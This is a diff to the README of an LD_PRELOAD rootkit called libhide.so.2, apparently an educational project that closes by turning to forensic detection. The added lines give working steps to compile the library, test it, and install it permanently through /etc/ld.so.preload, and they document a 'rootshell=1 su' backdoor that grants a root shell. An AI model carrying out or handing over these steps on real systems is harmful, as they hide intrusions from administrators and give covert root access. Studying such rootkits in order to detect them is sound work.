@@ -9,8 +9,28 @@ libhide.so.2 hides from all the typical tools that we rely on to tell us whats g
 [+] Hides a specified directory<br>
 [+] Hides entry in /etc/ld.so.preload
 
-Also, you can get a rootshell by typing 'rootshell=1 su' in your terminal<br>
-
+Also, you can get a rootshell
+```
+rootshell=1 su
+```
+```
+gcc -fPIC -shared -o libhide.so.2 libhide.c -ldl
+```
+To test this out, use the following (for example)
+```
+LD_PRELOAD=./libhide.so.2 ss -tulpn | grep 8000
+```
+To make it permanent, do the following:
+```
+sudo cp libhide.so.2 /usr/local/lib
+```
+```
+nano /etc/ld.so.preload
+```
+Enter the path to the shared library
+```
+/usr/local/lib/libhide.so.2
+```
 So then, with all the hiding information this rootkit does, how do we find it?<br>
 There are a couple simple forensic tools that we can use in order to determine what is going on here.<br>
 
